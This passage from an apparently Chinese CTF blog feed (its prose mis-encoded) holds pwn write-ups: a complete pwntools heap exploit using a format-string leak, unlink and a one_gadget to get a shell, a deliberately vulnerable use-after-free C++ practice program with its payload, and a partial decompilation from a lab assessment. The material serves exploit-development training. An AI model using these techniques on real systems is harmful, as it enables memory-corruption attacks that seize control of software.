<code>one_gadget</code><br>è§‚å¯Ÿè¿™ä¸ªæ—¶å€™æ ˆçš„åˆ†å¸ƒ<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1585924728797.png" alt="file"></p><p>å…ˆæ¥è§£é‡Šä¸€ä¸‹ <code>x/8gx $rsp + 0x30 - 0x30</code><br>å› ä¸ºéœ€è¦æ»¡è¶³æ¡ä»¶çš„åœ°å€æ˜¯ <code>$rsp + 0x30</code> ,è€Œä¸” <code>push</code> æ“ä½œæœ‰ 6 ä¸ª,æ¯ä¸ªå½±å“æ˜¯ <code>0x8</code></p><p>è§‚å¯Ÿåˆ° <code>$rsp + 0x30 - 0x8</code> çš„åœ°æ–¹æœ‰ä¸€ä¸ª 0,é‚£ä¹ˆå¯¹åº”çš„å°±éœ€è¦ä¸€ä¸ª <code>push</code> æ“ä½œ, ç°åœ¨æŠŠ <code>realloc + 0x10</code> æ”¹ä¸º <code>realloc + 0xC</code><br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1585924920221.png" alt="file"><br>å¯ä»¥çœ‹åˆ°å·²ç»æ»¡è¶³äº†æ¡ä»¶</p><p>å¾—åˆ°äº† shell<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1585924970041.png" alt="file"></p><h3 id="å®Œæ•´çš„exp"><a href="#å®Œæ•´çš„exp" class="headerlink" title="å®Œæ•´çš„exp"></a>å®Œæ•´çš„exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./heap&quot;</span>)</span><br><span class="line"><span class="comment">#sh = remote(&quot;node3.buuoj.cn&quot;,&quot;29506&quot;)</span></span><br><span class="line"><span class="comment">#elf = ELF(&#x27;./heap&#x27;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh,command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">command</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Enter the index you want to create (0-10):&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;size:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content,ends = <span class="number">1</span></span>):</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Enter an index:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Enter the content: &quot;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu()</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Enter an index:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">formats = <span class="string">&quot;%3$p%11$p&quot;</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;Enter your name: &quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(formats)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Hello, &quot;</span>)</span><br><span class="line">c = sh.recv(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">addr = <span class="built_in">int</span>(c,<span class="number">16</span>) - <span class="number">0x10</span></span><br><span class="line">print(<span class="string">&quot;addr ==&gt; %s&quot;</span>%<span class="built_in">hex</span>(addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;write&quot;</span>,addr)</span><br><span class="line">base = addr - libc.dump(<span class="string">&quot;write&quot;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line"></span><br><span class="line">c = sh.recv(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">codebase = <span class="built_in">int</span>(c,<span class="number">16</span>) - <span class="number">0x1186</span></span><br><span class="line">print(<span class="string">&quot;codebase ==&gt; %s&quot;</span>%<span class="built_in">hex</span>(codebase))</span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg(&quot;x/20gx &#123;&#125;&quot;.format(addr))</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xF8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xF8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xF8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0xF8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0xF8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">heapArray = codebase + <span class="number">0x202060</span></span><br><span class="line">fake_fd = heapArray + <span class="number">0x20</span></span><br><span class="line">payload = (p64(<span class="number">0</span>) + p64(<span class="number">0xE1</span>) + p64(fake_fd - <span class="number">0x18</span>) + p64(fake_fd - <span class="number">0x10</span>))</span><br><span class="line">payload = payload.ljust(<span class="number">0xE0</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0xE0</span>) + p64(<span class="number">0xE0</span>)</span><br><span class="line">payload += p64(<span class="number">0xF0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">atoi = <span class="number">0x201FA0</span></span><br><span class="line"></span><br><span class="line">malloc_hook = base + libc.dump(<span class="string">&quot;__malloc_hook&quot;</span>)</span><br><span class="line">realloc_hook = base + libc.dump(<span class="string">&quot;__realloc_hook&quot;</span>)</span><br><span class="line">realloc = base + libc.dump(<span class="string">&quot;realloc&quot;</span>)</span><br><span class="line">one = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(realloc_hook) + <span class="string">b&#x27;\xf8\x00&#x27;</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">one_gadget = one[<span class="number">1</span>] + base</span><br><span class="line">edit(<span class="number">1</span>,p64(one_gadget) + p64(realloc + <span class="number">0xC</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg(&quot;x/20gx &#123;&#125;&quot;.format(codebase + 0x202060))</span></span><br><span class="line">dbg(<span class="string">&quot;b *&#123;&#125;&quot;</span>.<span class="built_in">format</span>(one_gadget))</span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Enter the index you want to create (0-10):&quot;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">sh.recvuntil(<span class="string">&quot;size:&quot;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(<span class="number">0x88</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> heap </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€ä¸ªå †æº¢å‡ºçš„å°ä¾‹å­</title>
      <link href="/an_example.html"/>
      <url>/an_example.html</url>
      
        <content type="html"><![CDATA[<ul><li>è®©ç¨‹åºä¸­ï¼Œæœ‰ä¸¤ä¸ªæŒ‡æ ‡æŒ‡å‘åŒä¸€ä¸ªchunk<ul><li>ä¸€å—æ˜¯<strong>structure</strong>ï¼Œå¦ä¸€å—æ˜¯ç”¨ä½œ<strong>data buffer</strong></li><li>åˆ©ç”¨å¯¹<strong>buffer</strong>çš„è¯»å†™ï¼Œæ³„éœ²æˆ–è€…ä¿®æ”¹<strong>structure</strong>çš„å†…å®¹</li></ul></li></ul><a id="more"></a><h3 id="ç»ƒä¹ ç¨‹åº"><a href="#ç»ƒä¹ ç¨‹åº" class="headerlink" title="ç»ƒä¹ ç¨‹åº"></a>ç»ƒä¹ ç¨‹åº</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;class A&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span> <span class="keyword">public</span> A&#123;</span><br><span class="line"><span class="keyword">public</span> :</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;class B&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1233\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sh</span><span class="params">()</span> </span>&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pause</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//setbuf(stdin,0);</span></span><br><span class="line">setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">A *p = <span class="keyword">new</span> B();</span><br><span class="line"><span class="keyword">delete</span> p;</span><br><span class="line">add();</span><br><span class="line">fgets(buf, <span class="keyword">sizeof</span>(buf), <span class="built_in">stdin</span>);</span><br><span class="line">pause();</span><br><span class="line">add();</span><br><span class="line"><span class="keyword">char</span> *q = strdup(buf);</span><br><span class="line">p-&gt;print();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>è¯´æ˜:å…¶ä¸­çš„<strong>add()**å‡½æ•°ï¼Œæ˜¯æˆ‘ç”¨æ¥æ”¹å˜</strong>sh()<strong>çš„åœ°å€çš„,(æœ¬æ¥æ˜¯0aç»“å°¾ï¼Œä¼šè¢«æˆªæ–­)ï¼Œ</strong>pause()**æ˜¯è°ƒè¯•çš„æ—¶å€™ç”¨æ¥ä¸‹æ–­ç‚¹çš„ï¼Œsetvbuf(stdin,0,2,0)æ˜¯å¿…é¡»çš„ï¼Œä¸ç„¶fgetsä¼šæ‹¿èµ°fastbin</em></p><p>åœ¨CPPä¸­ï¼Œnewå¯¹è±¡çš„æ—¶å€™ä¼šåˆ›å»ºä¸€ä¸ªå †å—ï¼Œé‡Œé¢æ”¾å…¥å‚æ•°å’Œå‡½æ•°çš„åœ°å€ï¼Œè¿™é‡Œdelete pä¹‹åå¹¶æ²¡æœ‰è®©pæŒ‡å‘nullï¼Œæ‰€ä»¥pæŒ‡é’ˆè¿˜æœ‰å€¼ï¼Œå¯ä»¥è¢«è°ƒç”¨ï¼Œ<code>q = srtdup(buf)</code>å¯ä»¥æ‹¿åˆ°qå¯¹åº”çš„å †å—ï¼Œ<strong>æ”¹å†™å…¶ä¸­çš„æŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘buf + 8 ï¼Œç„¶åè®©buf + 8æŒ‡å‘sh()**ï¼Œå°±å¯ä»¥è°ƒç”¨</strong>sh()**å‡½æ•°</p><p>payloadå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./UAF&quot;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(sh,<span class="string">&quot;&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;1233&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x601160</span> + <span class="number">8</span>) + p64(<span class="number">0x40091b</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> heap </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æå…‰å®éªŒå®¤äºŒè¿›åˆ¶ç»„è€ƒæ ¸</title>
      <link href="/aurora_bin_test.html"/>
      <url>/aurora_bin_test.html</url>
      
        <content type="html"><![CDATA[<p>æå…‰å®éªŒå®¤äºŒè¿›åˆ¶ç»„è€ƒæ ¸pwné¢˜wp</p><a id="more"></a><h2 id="åç¼–è¯‘"><a href="#åç¼–è¯‘" class="headerlink" title="åç¼–è¯‘"></a>åç¼–è¯‘</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = setbufs(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    v3 = get_int();</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">delete</span>(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        edit(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Wrong choice!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">add</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> nbytes; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> nbytes_4; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which size you want to add?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. small&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. big&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. large&quot;</span>);</span><br><span class="line">  v1 = get_int(<span class="string">&quot;3. large&quot;</span>);</span><br><span class="line">  nbytes_4 = v1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    nbytes = <span class="number">104</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v1 == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    nbytes = <span class="number">1024</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong size!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nbytes = <span class="number">56</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)(<span class="number">8L</span>L * (v1 - <span class="number">1</span>) + a1) = <span class="built_in">malloc</span>(nbytes);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your info?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, *(<span class="keyword">void</span> **)(<span class="number">8L</span>L * (nbytes_4 - <span class="number">1</span>) + a1), (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">  *(_QWORD *)(<span class="number">8L</span>L * nbytes - <span class="number">8</span> + a1) = <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your info:&quot;</span>);</span><br><span class="line">  write(<span class="number">1</span>, *(<span class="keyword">const</span> <span class="keyword">void</span> **)(<span class="number">8L</span>L * (nbytes_4 - <span class="number">1</span>) + a1), (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Add successfully!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">edit</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> nbytes; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which size you want?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. small&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. big&quot;</span>);</span><br><span class="line">  v1 = get_int(<span class="string">&quot;2. big&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    nbytes = <span class="number">56</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 != <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong size!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nbytes = <span class="number">104</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = v1 - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)(<span class="number">8L</span>L * (v1 - <span class="number">1</span>) + a1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your info?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, *(<span class="keyword">void</span> **)(<span class="number">8L</span>L * v4 + a1), (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">    *(_QWORD *)(<span class="number">8L</span>L * nbytes - <span class="number">8</span> + a1) = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Edit successfully!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">delete</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which size you want to remove?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. 